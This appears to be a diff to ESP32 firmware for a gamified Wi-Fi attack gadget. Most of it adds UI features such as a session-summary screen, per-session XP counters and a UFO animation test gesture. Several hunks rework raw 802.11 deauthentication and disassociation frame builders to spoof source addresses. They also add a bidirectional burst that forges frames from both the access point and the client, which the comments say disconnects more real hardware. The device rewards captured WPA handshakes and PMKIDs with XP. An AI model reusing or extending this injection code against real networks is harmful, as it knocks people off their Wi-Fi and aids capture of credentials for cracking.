@@ -139,7 +139,8 @@ enum class PorkchopMode : uint8_t {
   CHARGING,
   WEBUI_MODE,
   PIG_PARTY,      // hidden easter egg — Konami-style gesture unlock
-  MATRIX_MODE     // hidden easter egg — second gesture, different payoff
+  MATRIX_MODE,    // hidden easter egg — second gesture, different payoff
+  SESSION_SUMMARY // shown once when leaving OINK_MODE/DNH_MODE, before landing on whatever was actually requested
 };
 
 // Plain-English mode name — used by the WebUI status endpoint (the
@@ -148,6 +149,7 @@ inline const char* porkchopModeName(PorkchopMode m) {
   switch (m) {
     case PorkchopMode::IDLE:           return "IDLE";
     case PorkchopMode::OINK_MODE:      return "OINK MODE";
+    case PorkchopMode::SESSION_SUMMARY: return "SESSION SUMMARY";
     case PorkchopMode::DNH_MODE:       return "DO NO HAM";
     case PorkchopMode::WARHOG_MODE:    return "SGT WARHOG";
     case PorkchopMode::PIGGYBLUES_MODE:return "PIGGY BLUES";
@@ -2006,6 +2008,16 @@ static uint32_t ufoStartMs         = 0;
 static bool     ufoIsAbducting     = true;       // true=taking the cow, false=returning it
 #define UFO_FLIGHT_MS 4500
 
+// Manual test trigger — the natural schedule only rolls once per 2-hour
+// night cycle at 35% odds (expected ~5-6 hours of continuous uptime
+// before it fires on its own), which isn't practical for actually
+// verifying it works. This starts the flight immediately, on demand.
+void triggerUFO() {
+  ufoActive = true;
+  ufoStartMs = millis();
+  ufoIsAbducting = !cowAbducted;
+}
+
 template<typename T>
 void draw(T& dst, int yOff) {
   const int horizonY = yOff + 140;
@@ -2040,7 +2052,7 @@ void draw(T& dst, int yOff) {
     lastProcessedCycle = currentCycle;
     if (cowAbducted) {
       ufoAppearAtMs = millis() + random(5000, 90000); // return flight, sometime in the first 1.5 min of night
-    } else if (random(0, 100) < 35) {                  // 35% chance of an abduction any given night
+    } else if (random(0, 100) < 70) {                  // 70% chance of an abduction any given night — the "isMoon" window itself already provides real rarity (only 1 hour out of every 2), so this doesn't need to be as conservative as it was
       ufoAppearAtMs = millis() + random(5000, 90000);
     } else {
       ufoAppearAtMs = 0;
@@ -2483,6 +2495,14 @@ namespace XP {
   uint32_t    getLifetimeNets();
   uint32_t    getLifetimeHS();
   uint32_t    getLifetimePMKID();
+  uint8_t     getModeSessionHS();
+  uint8_t     getModeSessionPMKID();
+  uint8_t     getModeSessionDeauth();
+  uint32_t    getModeSessionNets();
+  uint32_t    getModeSessionXP();
+  uint32_t    getModeSessionStartMs();
+  void        startModeSession();
+  void        endModeSession();
   uint32_t    getLNets();
   uint32_t    getLHS();
   uint32_t    getLPMKID();
@@ -3272,6 +3292,47 @@ void drawListHeader(T& dst, int yOff, const char* title) {
   dst.setTextColor(colorFG(), colorBG());
   dst.drawString(title, DISPLAY_W/2, yOff+2);
   dst.drawLine(4, yOff+14, DISPLAY_W-4, yOff+14, colorFG());
+}
+
+// ============================================================
+// SESSION SUMMARY — shown once when leaving an active capture session
+// (OINK_MODE or DNH_MODE), before landing on whatever screen was
+// actually requested. See XP::startModeSession()/endModeSession() and
+// the redirect logic in enterMode().
+// ============================================================
+template<typename T>
+void drawSessionSummary(T& dst, int yOff) {
+  CircuitPulse::draw(dst, yOff);
+  drawListHeader(dst, yOff, "SESSION SUMMARY");
+
+  uint32_t durationMs = millis() - XP::getModeSessionStartMs();
+  uint32_t durationSec = durationMs / 1000;
+  uint32_t mm = durationSec / 60, ss = durationSec % 60;
+
+  dst.setTextDatum(TL_DATUM);
+  dst.setTextSize(1);
+  dst.setTextColor(colorFG(), colorBG());
+
+  int y = yOff + 24;
+  char line[40];
+  snprintf(line, sizeof(line), "DURATION:    %02lu:%02lu", (unsigned long)mm, (unsigned long)ss);
+  dst.drawString(line, 14, y); y += 14;
+  snprintf(line, sizeof(line), "NETS FOUND:  %lu", (unsigned long)XP::getModeSessionNets());
+  dst.drawString(line, 14, y); y += 14;
+  snprintf(line, sizeof(line), "HANDSHAKES:  %u", XP::getModeSessionHS());
+  dst.drawString(line, 14, y); y += 14;
+  snprintf(line, sizeof(line), "PMKIDS:      %u", XP::getModeSessionPMKID());
+  dst.drawString(line, 14, y); y += 14;
+  snprintf(line, sizeof(line), "DEAUTHS:     %u", XP::getModeSessionDeauth());
+  dst.drawString(line, 14, y); y += 14;
+
+  dst.setTextColor(0x07E0, colorBG()); // green, matches the XP-gain toast color elsewhere
+  snprintf(line, sizeof(line), "XP EARNED:   +%lu", (unsigned long)XP::getModeSessionXP());
+  dst.drawString(line, 14, y);
+  dst.setTextColor(colorFG(), colorBG());
+
+  dst.setTextDatum(TC_DATUM);
+  dst.drawString("TAP or HOLD to continue", DISPLAY_W/2, yOff + MAIN_H - 14);
 }
 
 void drawTopBar() {
@@ -4851,6 +4912,13 @@ void update() {
       break;
     }
 
+    // ── SESSION_SUMMARY ──────────────────────────────────────────────────────
+    case PorkchopMode::SESSION_SUMMARY: {
+      if (useSprite) drawSessionSummary(mainSprite, 0);
+      else           drawSessionSummary(tft,        TOP_BAR_H);
+      break;
+    }
+
     // ── UNLOCKABLES ──────────────────────────────────────────────────────────
     case PorkchopMode::UNLOCKABLES: {
       // SHA256-verified secret phrases — mbedtls is available on ESP32
@@ -5405,6 +5473,42 @@ bool consumeArmed() {
 } // namespace MudBath
 
 // ============================================================
+// TEST TRIGGER: UFO gesture tracker
+// In the MENU, tap LEFT LEFT UP DOWN to fire the UFO flight immediately.
+// The natural schedule only rolls once per 2-hour night cycle, so this
+// exists purely so the animation can actually be checked on demand.
+// Starts with LEFT specifically — the one starting input not already
+// claimed by PartyPig(UP)/RedPill(RIGHT)/MudBath(DOWN).
+// ============================================================
+namespace UfoTest {
+
+enum Dir : uint8_t { NONE = 0, UP, DOWN, LEFT, RIGHT };
+static const Dir CODE[4] = { LEFT, LEFT, UP, DOWN };
+static uint8_t  progress    = 0;
+static uint32_t lastInputMs = 0;
+static bool     armed       = false;
+#define UFOTEST_INPUT_TIMEOUT_MS 3000
+
+void feed(Dir d) {
+  uint32_t now = millis();
+  if (progress > 0 && now - lastInputMs > UFOTEST_INPUT_TIMEOUT_MS) progress = 0;
+  lastInputMs = now;
+  if (d == CODE[progress]) {
+    progress++;
+    if (progress >= 4) { armed = true; progress = 0; }
+  } else {
+    progress = (d == CODE[0]) ? 1 : 0;
+  }
+}
+
+bool consumeArmed() {
+  if (armed) { armed = false; return true; }
+  return false;
+}
+
+} // namespace UfoTest
+
+// ============================================================
 // EASTER EGG: RED PILL gesture tracker
 // A second, distinct sequence on the same MENU D-pad zones — RIGHT LEFT
 // RIGHT LEFT UP UP DOWN DOWN, then HOLD — unlocking a different payoff
@@ -5837,24 +5941,31 @@ void drainRings()    { _drainBeaconRing(); }
 namespace WSLBypasser {
 
 // Deauth: reason 7 = class 3 frame from non-associated STA
-bool sendDeauthFrame(const uint8_t* bssid, uint8_t ch, const uint8_t* sta, uint8_t reason=7) {
+// Takes explicit destination (da) and source (sa) addresses, separate
+// from bssid (the BSSID field, which always identifies the real AP
+// regardless of which direction the frame is spoofed in) — this is what
+// makes bidirectional deauth possible: AP->client uses da=client,
+// sa=bssid; client->AP uses da=bssid, sa=client; either way bssid stays
+// correct in the BSSID field.
+bool sendDeauthFrame(const uint8_t* da, const uint8_t* sa, const uint8_t* bssid, uint8_t ch, uint8_t reason=7) {
   esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
   uint8_t pkt[26] = {
     0xC0,0x00, 0x00,0x00,       // FC=deauth, duration=0
-    0,0,0,0,0,0,                 // DA (client or broadcast)
-    0,0,0,0,0,0,                 // SA (BSSID)
+    0,0,0,0,0,0,                 // DA
+    0,0,0,0,0,0,                 // SA
     0,0,0,0,0,0,                 // BSSID
     0x00,0x00,                   // SeqCtrl
     reason,0x00                  // reason code
   };
-  memcpy(pkt+4,  sta,   6);
-  memcpy(pkt+10, bssid, 6);
+  memcpy(pkt+4,  da,    6);
+  memcpy(pkt+10, sa,    6);
   memcpy(pkt+16, bssid, 6);
   return esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false) == ESP_OK;
 }
 
-// Disassoc: reason 8 = station leaving BSS
-bool sendDisassocFrame(const uint8_t* bssid, uint8_t ch, const uint8_t* sta, uint8_t reason=8) {
+// Disassoc: reason 8 = station leaving BSS. Same da/sa/bssid split as
+// sendDeauthFrame, same reasoning.
+bool sendDisassocFrame(const uint8_t* da, const uint8_t* sa, const uint8_t* bssid, uint8_t ch, uint8_t reason=8) {
   esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
   uint8_t pkt[26] = {
     0xA0,0x00, 0x00,0x00,       // FC=disassoc
@@ -5863,8 +5974,8 @@ bool sendDisassocFrame(const uint8_t* bssid, uint8_t ch, const uint8_t* sta, uin
     0,0,0,0,0,0,
     0x00,0x00, reason,0x00
   };
-  memcpy(pkt+4,  sta,   6);
-  memcpy(pkt+10, bssid, 6);
+  memcpy(pkt+4,  da,    6);
+  memcpy(pkt+10, sa,    6);
   memcpy(pkt+16, bssid, 6);
   return esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false) == ESP_OK;
 }
@@ -6022,6 +6133,33 @@ static uint8_t  _sessionDeauth = 0;
 static uint32_t _sessionNets = 0;
 static uint32_t _bleTotal = 0;
 static uint32_t _sessionStartMs = 0;
+
+// ── Per-active-mode session tracking (for the session summary screen) ──
+// Deliberately separate from the _session* counters above, which track
+// "since boot" and reset only once at device startup — these reset every
+// time an active mode (OINK, DNH, etc.) is entered, so the summary shown
+// on exit reflects just that one sitting, not the whole uptime.
+static uint8_t  _modeSessionHS = 0;
+static uint8_t  _modeSessionPMKID = 0;
+static uint8_t  _modeSessionDeauth = 0;
+static uint32_t _modeSessionNets = 0;
+static uint32_t _modeSessionXP = 0;
+static uint32_t _modeSessionStartMs = 0;
+static bool     _modeSessionActive = false;
+
+void startModeSession() {
+  _modeSessionHS = 0; _modeSessionPMKID = 0; _modeSessionDeauth = 0;
+  _modeSessionNets = 0; _modeSessionXP = 0;
+  _modeSessionStartMs = millis();
+  _modeSessionActive = true;
+}
+
+// Called once when the summary screen has been shown — clears the
+// "active" flag so re-entering IDLE without a fresh mode session doesn't
+// show a stale/empty summary again.
+void endModeSession() {
+  _modeSessionActive = false;
+}
 static uint32_t _firstNetMs = 0;        // When first network found this session (for SPEED_RUN)
 static bool     _nightOwlAwarded = false;    // ACH_NIGHT_OWL checked this session
 static bool     _earlyBirdAwarded = false;   // ACH_EARLY_BIRD checked this session
@@ -6084,7 +6222,7 @@ void gain(XPEvent ev) {
   if (!_inited) init();
   uint16_t amt = (ev < 18) ? XP_VALS[ev] : 1;
   uint8_t oldL = _level;
-  _totalXP += amt; _sessionXP += amt;
+  _totalXP += amt; _sessionXP += amt; if (_modeSessionActive) _modeSessionXP += amt;
   _level = _calcLevel(_totalXP);
   _lastGainMs = millis(); _lastGainAmt = amt;
   if (_level > oldL) {
@@ -6110,15 +6248,15 @@ void gain(XPEvent ev) {
 static void checkAchievements(); // forward decl — defined below
 
 void addNet()    {
-  _lNets++; _sessionNets++;
+  _lNets++; _sessionNets++; if (_modeSessionActive) _modeSessionNets++;
   if (_firstNetMs == 0) _firstNetMs = millis();  // Record first net time for SPEED_RUN
   gain(NETWORK_FOUND);
   checkAchievements();
 }
-void addHS()     { _lHS++;  _sessionHS++;   gain(HANDSHAKE_CAPTURED); checkAchievements(); Display::triggerCaptureFlash(); Display::triggerLedFlash(LED_G_PIN, 200); }
-void addPMKID()  { _lPMKID++;               gain(PMKID_CAPTURED);     checkAchievements(); Display::triggerCaptureFlash(); Display::triggerLedFlash(LED_G_PIN, 200); }
+void addHS()     { _lHS++;  _sessionHS++;   if (_modeSessionActive) _modeSessionHS++;    gain(HANDSHAKE_CAPTURED); checkAchievements(); Display::triggerCaptureFlash(); Display::triggerLedFlash(LED_G_PIN, 200); }
+void addPMKID()  { _lPMKID++;               if (_modeSessionActive) _modeSessionPMKID++; gain(PMKID_CAPTURED);     checkAchievements(); Display::triggerCaptureFlash(); Display::triggerLedFlash(LED_G_PIN, 200); }
 void addDeauth() {
-  _lDeauth++; _sessionDeauth++; gain(DEAUTH_SENT); checkAchievements();
+  _lDeauth++; _sessionDeauth++; if (_modeSessionActive) _modeSessionDeauth++; gain(DEAUTH_SENT); checkAchievements();
   // Throttled to avoid flashing on every single packet during a rapid burst
   static uint32_t lastDeauthFx = 0;
   if (millis() - lastDeauthFx > 400) {
@@ -6289,6 +6427,12 @@ uint8_t getProgress() {
 }
 bool  shouldShowXP()  { return (millis()-_lastGainMs)<5000; }
 uint16_t lastGainAmt(){ return _lastGainAmt; }
+uint8_t  getModeSessionHS()      { return _modeSessionHS; }
+uint8_t  getModeSessionPMKID()   { return _modeSessionPMKID; }
+uint8_t  getModeSessionDeauth()  { return _modeSessionDeauth; }
+uint32_t getModeSessionNets()    { return _modeSessionNets; }
+uint32_t getModeSessionXP()      { return _modeSessionXP; }
+uint32_t getModeSessionStartMs() { return _modeSessionStartMs; }
 uint32_t getLifetimeNets()  { return _lNets; }
 uint32_t getLifetimeHS()    { return _lHS; }
 uint32_t getLifetimePMKID() { return _lPMKID; }
@@ -6297,7 +6441,7 @@ uint32_t getLifetimePMKID() { return _lPMKID; }
 void addXPSilent(uint16_t amt) {
   if (!_inited) init();
   uint8_t oldL = _level;
-  _totalXP += amt; _sessionXP += amt;
+  _totalXP += amt; _sessionXP += amt; if (_modeSessionActive) _modeSessionXP += amt;
   _level = _calcLevel(_totalXP);
   if (_level > oldL) {
     char buf[40]; snprintf(buf,sizeof(buf),"LEVEL UP! LVL %d",_level);
@@ -7250,10 +7394,29 @@ static void _setChannel(uint8_t ch) {
 }
 
 // ── Deauth helpers ───────────────────────────────────────────
+// Forward direction only (AP->client). Used for broadcast bursts, where
+// there's no single real client to spoof as the source — broadcast DA
+// inherently means "to everyone," which has no meaningful reverse.
 static void _sendBurst(const uint8_t* bssid, const uint8_t* sta, uint8_t n) {
+  uint8_t ch = NetworkRecon::getChannel();
   for (uint8_t i=0; i<n; i++) {
-    WSLBypasser::sendDeauthFrame(bssid, NetworkRecon::getChannel(), sta, 7);
-    WSLBypasser::sendDisassocFrame(bssid, NetworkRecon::getChannel(), sta, 8);
+    WSLBypasser::sendDeauthFrame(sta, bssid, bssid, ch, 7);
+    WSLBypasser::sendDisassocFrame(sta, bssid, bssid, ch, 8);
+  }
+}
+
+// Bidirectional — AP->client AND client->AP, for targeted bursts against
+// a specific known client MAC. Established technique: some AP firmware
+// and client drivers only reliably drop the session when the deauth
+// appears to come from their own side, so sending both directions covers
+// more real-world hardware than forward-only ever could.
+static void _sendBurstBidirectional(const uint8_t* bssid, const uint8_t* sta, uint8_t n) {
+  uint8_t ch = NetworkRecon::getChannel();
+  for (uint8_t i=0; i<n; i++) {
+    WSLBypasser::sendDeauthFrame(sta, bssid, bssid, ch, 7);    // AP -> client
+    WSLBypasser::sendDisassocFrame(sta, bssid, bssid, ch, 8);
+    WSLBypasser::sendDeauthFrame(bssid, sta, bssid, ch, 7);    // client -> AP
+    WSLBypasser::sendDisassocFrame(bssid, sta, bssid, ch, 8);
   }
 }
 
@@ -7728,7 +7891,7 @@ void update() {
         uint8_t nClients = NetworkRecon::getClients(tBssid, clientBuf, CLIENT_MAX_PER_AP);
         for (uint8_t ci=0; ci<nClients; ci++) {
           const uint8_t* sta = clientBuf + ci*6;
-          _sendBurst(tBssid, sta, 2);  // 2x per client — less airtime, still effective
+          _sendBurstBidirectional(tBssid, sta, 2);  // 2x per client, both directions — more effective than broadcast, worth the extra frames for a known target
           _deauthTotal += 2;
         }
         XP::addDeauth();
@@ -9471,7 +9634,14 @@ void checkScan() {
 // ============================================================
 // MODE TRANSITIONS — start/stop active subsystems cleanly
 // ============================================================
+PorkchopMode pendingModeAfterSummary = PorkchopMode::IDLE;
+
 void enterMode(PorkchopMode m) {
+  // Leaving an active capture session (OINK/DNH) gets a summary screen
+  // first, before landing on whatever was actually requested — the real
+  // transition to `m` happens when the summary is dismissed, not here.
+  bool leavingActiveSession = (currentMode == PorkchopMode::OINK_MODE || currentMode == PorkchopMode::DNH_MODE);
+
   // Stop current active mode first
   switch(currentMode){
     case PorkchopMode::OINK_MODE:       OinkMode::stop(); break;
@@ -9487,11 +9657,19 @@ void enterMode(PorkchopMode m) {
     case PorkchopMode::MATRIX_MODE:     MatrixFX::stop(); break;
     default: break;
   }
+
+  if (leavingActiveSession) {
+    XP::endModeSession();
+    pendingModeAfterSummary = m;
+    currentMode = PorkchopMode::SESSION_SUMMARY;
+    return;
+  }
+
   currentMode=m;
   // Start new mode
   switch(m){
-    case PorkchopMode::OINK_MODE:       OinkMode::start(); WarTales::logEvent("OINK MODE started"); break;
-    case PorkchopMode::DNH_MODE:        DNHMode::start(); WarTales::logEvent("DNH MODE started"); break;
+    case PorkchopMode::OINK_MODE:       OinkMode::start(); XP::startModeSession(); WarTales::logEvent("OINK MODE started"); break;
+    case PorkchopMode::DNH_MODE:        DNHMode::start(); XP::startModeSession(); WarTales::logEvent("DNH MODE started"); break;
     case PorkchopMode::WARHOG_MODE:     WarhogMode::start(); WarTales::logEvent("WARHOG started"); break;
     case PorkchopMode::PIGGYBLUES_MODE: PiggyBlues::start(); break;
     case PorkchopMode::BACON_MODE:      BaconMode::start(); break;
@@ -9591,28 +9769,33 @@ void handleInput() {
           PartyPig::feed(PartyPig::UP);
           RedPill::feed(RedPill::UP);
           MudBath::feed(MudBath::UP);
+          UfoTest::feed(UfoTest::UP);
         } else if (zone == 2) {
           // Scroll down
           if (menuSel < _MCOUNT - 1) menuSel++;
           PartyPig::feed(PartyPig::DOWN);
           RedPill::feed(RedPill::DOWN);
           MudBath::feed(MudBath::DOWN);
+          UfoTest::feed(UfoTest::DOWN);
         } else if (tx < DISPLAY_W / 3) {
           // Mid-band left third = LEFT gesture only (no select, so the
           // easter-egg sequence can be entered without firing a menu item)
           PartyPig::feed(PartyPig::LEFT);
           RedPill::feed(RedPill::LEFT);
           MudBath::feed(MudBath::LEFT);
+          UfoTest::feed(UfoTest::LEFT);
         } else if (tx > DISPLAY_W * 2 / 3) {
           // Mid-band right third = RIGHT gesture only
           PartyPig::feed(PartyPig::RIGHT);
           RedPill::feed(RedPill::RIGHT);
           MudBath::feed(MudBath::RIGHT);
+          UfoTest::feed(UfoTest::RIGHT);
         } else {
           // Mid-band center third = select current item
           PartyPig::feed(PartyPig::NONE);
           RedPill::feed(RedPill::NONE);
           MudBath::feed(MudBath::NONE);
+          UfoTest::feed(UfoTest::NONE);
           switch(menuSel) {
             case  0: enterMode(PorkchopMode::OINK_MODE); break;
             case  1: enterMode(PorkchopMode::DNH_MODE);  break;
@@ -9652,6 +9835,11 @@ void handleInput() {
           Avatar::startMudBath();
           Display::showToast("MUD BATH TIME", 1800);
           SFX::play(SFX::OINK_SFX);
+        } else if (UfoTest::consumeArmed()) {
+          currentMode = PorkchopMode::IDLE;
+          menuScroll = 0; menuSel = 0;
+          FarmScene::triggerUFO();
+          Display::showToast("INCOMING...", 1500);
         } else {
           currentMode = PorkchopMode::IDLE;
           menuScroll = 0; menuSel = 0;
@@ -9671,6 +9859,17 @@ void handleInput() {
       if (isTap || isHold) {
         MatrixFX::stop();
         currentMode = PorkchopMode::IDLE;
+      }
+      break;
+
+    case PorkchopMode::SESSION_SUMMARY:
+      if (isTap || isHold) {
+        // Completes whatever transition was originally requested when the
+        // active session was left (usually IDLE, but honor whatever it
+        // actually was) — currentMode is SESSION_SUMMARY right now, not
+        // OINK/DNH, so this call's own "leaving an active session" check
+        // won't re-trigger and redirect back here again.
+        enterMode(pendingModeAfterSummary);
       }
       break;
 
@@ -9839,6 +10038,7 @@ void handleInput() {
         if (++diagTaps >= 7) {
           diagTaps = 0;
           XP::unlockAchievement2(ACH2_DEBUG_MASTER);
+          FarmScene::triggerUFO();
         }
       }
       if (isHold) {
